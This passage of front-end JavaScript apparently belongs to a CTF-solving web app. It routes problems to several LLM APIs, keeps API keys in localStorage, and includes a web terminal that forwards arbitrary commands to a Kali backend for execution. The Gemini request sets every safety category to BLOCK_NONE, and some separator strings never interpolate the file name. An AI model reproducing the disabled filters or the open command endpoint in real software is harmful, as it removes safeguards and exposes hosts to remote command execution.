    const ext=file.name.split('.').pop().toLowerCase();
    const item=document.createElement('div');item.className='file-item';
    item.innerHTML=`<span class="file-name">${escapeHtml(file.name)}</span><span class="file-size">${formatSize(file.size)}</span><button class="file-remove" onclick="this.parentElement.remove()">×</button>`;
    list.appendChild(item);
    if(TEXT_EXTS.includes(ext)){
      const reader=new FileReader();
      reader.onload=()=>{
        const ta=document.getElementById('ai-input');
        const sep=ta.value?'\n\n--- ${file.name} ---\n\n':'';
        ta.value+=sep+reader.result;
        ta.dispatchEvent(new Event('input'));
      };
      reader.readAsText(file);
    }else if(BINARY_EXTS.includes(ext)){
      showToast(`${file.name}: Binary file (${ext}), showing hex preview`,'warn');
      const reader=new FileReader();
      reader.onload=()=>{
        const bytes=new Uint8Array(reader.result);
        let hex='';const max=Math.min(bytes.length,512);
        for(let i=0;i<max;i++) hex+=bytes[i].toString(16).padStart(2,'0')+(i%16===15?'\n':' ');
        const ta=document.getElementById('ai-input');
        const sep=ta.value?'\n\n--- ${file.name} (hex preview, ${bytes.length} bytes) ---\n\n':'';
        ta.value+=sep+hex;
      };
      reader.readAsArrayBuffer(file);
    }else{
      showToast(`${file.name}: Unknown type, reading as text`,'warn');
      const reader=new FileReader();
      reader.onload=()=>{
        const ta=document.getElementById('ai-input');
        const sep=ta.value?'\n\n--- ${file.name} ---\n\n':'';
        ta.value+=sep+reader.result.substring(0,10000);
      };
      reader.readAsText(file);
    }
  }
}

function formatSize(bytes){
  if(bytes<1024) return bytes+'B';
  if(bytes<1024*1024) return (bytes/1024).toFixed(1)+'KB';
  return (bytes/(1024*1024)).toFixed(1)+'MB';
}

async function autoAISolve(){
  const provider=document.getElementById('ai-provider').value;
  const keyInput=document.getElementById('ai-api-key').value.trim();
  const savedKey=localStorage.getItem('ai_api_key');
  const key=keyInput||savedKey;

  if(provider!=='backend'&&!key){showToast('Enter your API key first','warn');return}

  // Save fields
  if(keyInput) localStorage.setItem('ai_api_key',keyInput);
  localStorage.setItem('ai_provider',provider);

  const problem=document.getElementById('ai-input').value.trim();
  if(!problem){showToast('Enter a CTF problem','warn');return}

  const responseEl=document.getElementById('ai-response');
  responseEl.innerHTML=`<div class="auto-placeholder"><div class="ai-thinking">🤖 AI is analyzing your problem...</div></div>`;

  try{
    let content;
    if(provider==='backend'){
      const bm=document.getElementById('ai-backend-model')?.value||'openrouter';
      content=await callBackendAI(problem,bm);
    }else if(provider==='openrouter'){
      content=await callOpenRouter(key,problem);
    }else if(provider==='groq'){
      content=await callGroq(key,problem);
    }else if(provider==='gemini'){
      content=await callGemini(key,problem);
    }else if(provider==='openai'){
      content=await callOpenAI(key,problem);
    }else if(provider==='custom'){
      content=await callCustom(key,problem);
    }
    renderAiResponse(content||'No response from AI');
  }catch(err){
    responseEl.innerHTML=`<div class="ai-error">❌ Error: ${escapeHtml(err.message)}</div>`;
  }
}

async function apiFetch(url,opts,timeoutMs=60000){
  const ctrl=new AbortController();
  const timer=setTimeout(()=>ctrl.abort(),timeoutMs);
  try{
    const res=await fetch(url,{...opts,signal:ctrl.signal});
    clearTimeout(timer);
    if(!res.ok){
      const err=await res.json().catch(()=>({}));
      throw new Error(err.error?.message||err.error?.details||`HTTP ${res.status}`);
    }
    return res;
  }catch(e){
    clearTimeout(timer);
    if(e.name==='AbortError') throw new Error('Request timed out after '+(timeoutMs/1000)+'s');
    throw e;
  }
}

async function callBackendAI(problem,provider='openrouter'){
  const res=await fetch('/api/solve',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({problem,provider})
  });
  const data=await res.json();
  if(!data.success) throw new Error(data.error||'Backend AI failed');
  return data.content;
}

async function callOpenRouter(key,problem){
  const model=document.getElementById('ai-or-model')?.value||'deepseek/deepseek-r1:free';
  const res=await apiFetch('https://openrouter.ai/api/v1/chat/completions',{
    method:'POST',
    headers:{
      'Content-Type':'application/json',
      'Authorization':`Bearer ${key}`,
      'HTTP-Referer':'https://sujanctfsolver.vercel.app',
      'X-Title':'SUJANSCTFSOLVER'
    },
    body:JSON.stringify({
      model:model,
      messages:[{role:'system',content:AI_SYSTEM_PROMPT},{role:'user',content:problem}],
      max_tokens:8192,
      temperature:0.2
    })
  },120000);
  const data=await res.json();
  if(data.error) throw new Error(data.error.message||data.error);
  return data.choices?.[0]?.message?.content||null;
}

async function callGroq(key,problem){
  const model='llama-3.3-70b-versatile';
  const res=await apiFetch('https://api.groq.com/openai/v1/chat/completions',{
    method:'POST',
    headers:{'Content-Type':'application/json','Authorization':`Bearer ${key}`},
    body:JSON.stringify({
      model:model,
      messages:[{role:'system',content:AI_SYSTEM_PROMPT},{role:'user',content:problem}],
      max_tokens:8192,
      temperature:0.2
    })
  },120000);
  const data=await res.json();
  if(data.error) throw new Error(data.error.message||JSON.stringify(data.error));
  return data.choices?.[0]?.message?.content||null;
}

async function callOpenAI(key,problem){
  const res=await apiFetch('https://api.openai.com/v1/chat/completions',{
    method:'POST',
    headers:{'Content-Type':'application/json','Authorization':`Bearer ${key}`},
    body:JSON.stringify({
      model:'gpt-4o-mini',
      messages:[{role:'system',content:AI_SYSTEM_PROMPT},{role:'user',content:problem}],
      max_tokens:4096,
      temperature:0.3
    })
  });
  const data=await res.json();
  return data.choices?.[0]?.message?.content;
}

async function callGemini(key,problem){
  const model='gemini-2.0-flash';
  const url=`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent`;
  const res=await apiFetch(url,{
    method:'POST',
    headers:{'Content-Type':'application/json','x-goog-api-key':key},
    body:JSON.stringify({
      contents:[{
        parts:[{text:`${AI_SYSTEM_PROMPT}\n\n--- CTF PROBLEM ---\n\n${problem}\n\n--- RESPONSE ---\nProvide step-by-step solution. If you find a flag, output it as 🏴 FLAG: flag{...}`}]
      }],
      safetySettings:[
        {category:'HARM_CATEGORY_HARASSMENT',threshold:'BLOCK_NONE'},
        {category:'HARM_CATEGORY_HATE_SPEECH',threshold:'BLOCK_NONE'},
        {category:'HARM_CATEGORY_SEXUALLY_EXPLICIT',threshold:'BLOCK_NONE'},
        {category:'HARM_CATEGORY_DANGEROUS_CONTENT',threshold:'BLOCK_NONE'}
      ],
      generationConfig:{
        maxOutputTokens:8192,
        temperature:0.3
      }
    })
  },90000);
  const data=await res.json().catch(()=>({error:{message:'Failed to parse response - possible network/CORS error'}}));
  if(!res.ok||data.error){
    const msg=data.error?.message||data.error?.details||`HTTP ${res.status}`;
    throw new Error(msg);
  }
  if(!data.candidates||data.candidates.length===0){
    if(data.promptFeedback?.blockReason) throw new Error(`Prompt blocked: ${data.promptFeedback.blockReason}`);
    throw new Error('Empty response from Gemini (no candidates returned)');
  }
  const candidate=data.candidates[0];
  if(candidate.finishReason&&candidate.finishReason!=='STOP'&&candidate.finishReason!=='MAX_TOKENS'){
    throw new Error(`Response ${candidate.finishReason}: ${candidate.finishMessage||'content filtered'}`);
  }
  const text=candidate.content?.parts?.map(p=>p.text).join('\n');
  if(!text) throw new Error('Empty response - content may have been blocked');
  return text;
}

async function callCustom(key,problem){
  const customUrl=localStorage.getItem('ai_custom_url')||document.getElementById('ai-custom-url')?.value.trim();
  if(!customUrl){throw new Error('Enter a Custom API URL')}
  let customModel=localStorage.getItem('ai_custom_model')||document.getElementById('ai-custom-model')?.value.trim();
  if(!customModel) customModel='default';

  const headers={'Content-Type':'application/json'};
  if(key) headers['Authorization']=`Bearer ${key}`;

  const res=await apiFetch(customUrl,{
    method:'POST',
    headers:headers,
    body:JSON.stringify({
      model:customModel,
      messages:[{role:'system',content:AI_SYSTEM_PROMPT},{role:'user',content:problem}],
      max_tokens:4096,
      temperature:0.3
    })
  });
  const data=await res.json();
  return data.choices?.[0]?.message?.content||data.response||null;
}

function renderAiResponse(content){
  const el=document.getElementById('ai-response');
  let html=escapeHtml(content);
  html=html.replace(/```(\w*)\n([\s\S]*?)```/g,'<pre><code>$2</code></pre>');
  html=html.replace(/`([^`]+)`/g,'<code>$1</code>');
  html=html.replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>');
  html=html.replace(/\n/g,'<br>');
  el.innerHTML=`<div class="ai-response-content">${html}</div>`;
}

// Load saved AI config on init + provider/model toggles
(function(){
  const savedKey=localStorage.getItem('ai_api_key');
  const savedProvider=localStorage.getItem('ai_provider');
  const savedCustomUrl=localStorage.getItem('ai_custom_url');
  const savedCustomModel=localStorage.getItem('ai_custom_model');
  const savedOrModel=localStorage.getItem('ai_or_model');
  if(savedKey){const el=document.getElementById('ai-api-key');if(el) el.value=savedKey}
  if(savedProvider){const el=document.getElementById('ai-provider');if(el) el.value=savedProvider}
  if(savedCustomUrl){const el=document.getElementById('ai-custom-url');if(el) el.value=savedCustomUrl}
  if(savedCustomModel){const el=document.getElementById('ai-custom-model');if(el) el.value=savedCustomModel}
  if(savedOrModel){const el=document.getElementById('ai-or-model');if(el) el.value=savedOrModel}

  const sel=document.getElementById('ai-provider');
  const backendField=document.getElementById('ai-backend-model-field');
  const orField=document.getElementById('ai-or-model-field');
  const custUrlField=document.getElementById('ai-custom-url-field');
  const custModelField=document.getElementById('ai-custom-model-field');
  const infoBox=document.getElementById('ai-provider-info');
  const keyRow=document.getElementById('ai-key-row');
  function toggleFields(){
    const v=sel?.value;
    if(backendField) backendField.style.display=v==='backend'?'block':'none';
    if(orField) orField.style.display=v==='openrouter'?'block':'none';
    if(custUrlField) custUrlField.style.display=v==='custom'?'block':'none';
    if(custModelField) custModelField.style.display=v==='custom'?'block':'none';
    if(infoBox) infoBox.style.display='block';
    const keyEl=document.getElementById('ai-api-key');
    if(keyEl){
      if(v==='backend'){
        keyEl.placeholder='No key needed — uses server keys';
        keyEl.disabled=true;
      }else{
        keyEl.disabled=false;
        const phs={
          openrouter:'Get free key at https://openrouter.ai/keys',
          groq:'Get free key at https://console.groq.com/keys',
          gemini:'Get free key at https://aistudio.google.com/apikey',
          openai:'sk-... your OpenAI API key',
          custom:'API key (if required)'
        };
        keyEl.placeholder=phs[v]||'API key';
      }
    }
    if(v==='openrouter'&&!localStorage.getItem('ai_or_model')){
      const orSel=document.getElementById('ai-or-model');
      if(orSel) orSel.value='meta-llama/llama-3.3-70b-instruct:free';
    }
  }
  if(sel) sel.addEventListener('change',toggleFields);
  toggleFields();
})();

// =============================================
// Terminal
// =============================================
let termHistory=[],termHistIdx=-1;
function terminalExecute(){
  const input=document.getElementById('terminal-input');
  const cmd=input.value.trim();
  if(!cmd) return;
  appendTermLine(`$ ${cmd}`,'term-dollar');
  input.value='';
  termHistory.push(cmd);
  termHistIdx=termHistory.length;
  if(cmd==='clear'){terminalClear();return}
  if(cmd==='help'){terminalHelp();return}
  fetch('/api/kali/exec',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({command:cmd})
  }).then(r=>r.json()).then(d=>{
    if(d.stdout) appendTermLine(d.stdout,'term-output');
    if(d.stderr) appendTermLine(d.stderr,'term-error');
    if(!d.stdout&&!d.stderr) appendTermLine('[no output]','term-output');
  }).catch(e=>{
    appendTermLine(`Error: ${e.message}`,'term-error');
  });
}
function appendTermLine(text,cls){
  const out=document.getElementById('terminal-output');
  const lines=text.split('\n');
  lines.forEach(line=>{
    const div=document.createElement('div');
    div.className='term-line';
    div.innerHTML=`<span class="${cls}">${escapeHtml(line)||' '}</span>`;
    out.appendChild(div);
  });
  out.scrollTop=out.scrollHeight;
}
function terminalClear(){
  document.getElementById('terminal-output').innerHTML='';
  appendTermLine('Terminal cleared','term-output');
}
function terminalKill(){
  showToast('Terminal reset','warn');
  terminalClear();
}
function terminalHelp(){
  appendTermLine('Available commands:','term-output');
  appendTermLine('  help     - Show this help','term-output');
  appendTermLine('  clear    - Clear terminal','term-output');
  appendTermLine('  whoami   - Current user','term-output');
  appendTermLine('  ipconfig - Network config','term-output');
  appendTermLine('  dir/ls   - List files','term-output');
  appendTermLine('  ping     - Test connectivity','term-output');
  appendTermLine('  nmap     - Scan ports (via Kali)','term-output');
  appendTermLine('  Any system command is executed locally','term-output');
}
function terminalQuick(cmd){
  document.getElementById('terminal-input').value=cmd;
  terminalExecute();
}
document.getElementById('terminal-input')?.addEventListener('keydown',e=>{
  if(e.key==='Enter') terminalExecute();
  else if(e.key==='ArrowUp'){
    e.preventDefault();
    if(termHistIdx>0){
      termHistIdx--;
      document.getElementById('terminal-input').value=termHistory[termHistIdx]||'';
    }
  }else if(e.key==='ArrowDown'){
    e.preventDefault();
    if(termHistIdx<termHistory.length-1){
      termHistIdx++;
      document.getElementById('terminal-input').value=termHistory[termHistIdx]||'';
    }else{
      termHistIdx=termHistory.length;
      document.getElementById('terminal-input').value='';
    }
  }
});

// =============================================
// Utils
// =============================================
function hexToBytes(hex){
  const bytes=[];
  for(let i=0;i<hex.length;i+=2) bytes.push(parseInt(hex.substring(i,i+2),16));
  return bytes;
}
function bytesToHex(bytes){
  return bytes.map(b=>b.toString(16).padStart(2,'0')).join(' ');
}
function escapeHtml(s){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function totoBigInt(v){
  if(typeof v==='bigint') return v;
  try{return globalThis.BigInt(v)}catch{return 0n}
}

// =============================================
// Init
// =============================================
checkKaliStatus();
setInterval(checkKaliStatus,30000);
setupFileUpload();
navigateTo('dashboard');
